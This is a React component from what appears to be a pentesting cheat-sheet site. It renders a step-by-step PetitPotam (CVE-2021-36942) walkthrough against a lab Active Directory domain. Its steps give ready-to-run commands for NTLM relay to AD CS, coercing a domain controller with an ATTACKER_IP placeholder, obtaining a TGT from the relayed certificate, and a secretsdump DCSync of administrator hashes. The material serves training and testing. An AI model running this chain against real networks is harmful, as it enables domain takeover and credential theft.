import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const PetitPotam = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability. This
              flaw allows an unauthenticated attacker to force a Domain
              Controller to authenticate against another host using NTLM over
              port 445 via the Local Security Authority Remote Protocol (LSARPC)
              by abusing Microsoft's Encrypting File System Remote Protocol
              (MS-EFSRPC) command EfsRpcOpenFileRaw. This technique allows an
              unauthenticated attacker to take over a Windows domain where
              Active Directory Certificate Services (AD CS) is in use.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              In the attack, an authentication request from the targeted Domain
              Controller is relayed to the Certificate Authority (CA) host's Web
              Enrollment page and makes a Certificate Signing Request (CSR) for
              a new digital certificate. This certificate can then be used with
              a tool such as `gettgtkinit.py` to request a TGT for the Domain
              Controller, which can then be used to achieve domain compromise
              via a DCSync attack.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Start `ntlmrelayx.py` and specify the Web Enrollment URL for the
              CA host.The CA is usually located at
              `https://&lt;servername&gt;/certsrv`.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Get the PetitPotam tool</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/topotam/PetitPotam.git"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Use PetitPotam to coerce the Domain Controller to authenticate to
              our host where `ntlmrelayx.py` is running.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"python3 PetitPotam.py {ATTACKER_IP} {DC_IP}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              In `ntlmrelayx.py` we will see a successful login request and
              obtain the base64 encoded certificate for the Domain Controller if
              the attack is successful.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>Get the `gettgtpkinit.py` tool</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/dirkjanm/PKINITtools"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>
              Use the `gettgtpkinit.py` tool to request a TGT for the Domain
              Controller using the Base64 encoded certificate.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGS.....<SNIP>.....uiZwm1Pz70+e0p2GZNVZDXlrwQIyr7YCKBdGmY= dc01.ccache"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 7</Typography>
            <Typography>
              The TGT will be saved to a file called `dc01.ccache`, which we use
              to set the `KRB5CCNAME` environment variable, so our attack host
              uses this file for Kerberos authentication attempts.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"export KRB5CCNAME=dc01.ccache"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 8</Typography>
            <Typography>
              Check that the TGT is saved using the `klist` command.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"klist"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 9</Typography>
            <Typography>
              We can then use this TGT with `secretsdump.py` to perform a DCSYnc
              and retrieve one or all of the NTLM password hashes for the
              domain.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL'
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PetitPotam;
